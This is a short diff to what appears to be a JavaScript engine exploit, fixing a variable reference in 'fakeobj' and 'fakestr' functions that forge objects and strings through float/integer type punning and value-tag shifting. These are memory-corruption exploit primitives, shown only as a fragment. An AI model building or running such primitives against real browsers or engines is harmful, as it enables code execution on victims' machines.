@@ -21,7 +21,7 @@ let fakeobj = function(thing){
     bitview[0] = thing >>> 0;
     let first = {"int" : 420, "object" : floatview[0]};
     first.eight();
-    let second = {"val" : o1.gg, "floattag" : -1};
+    let second = {"val" : first.gg, "floattag" : -1};
     second.eight();
     const result = o.hi;
     
@@ -37,7 +37,7 @@ let fakestr = function(thing){
     let first = {"int" : 420, "object" : floatview[0]};
     // shift the first value plane
     first.eight();
-    let second = {"val" : o1.gg, "floattag" : -7};
+    let second = {"val" : first.gg, "floattag" : -7};
     // shift the second value plane
     // suddenly, value of thing is now tagged with a str!
     second.eight();
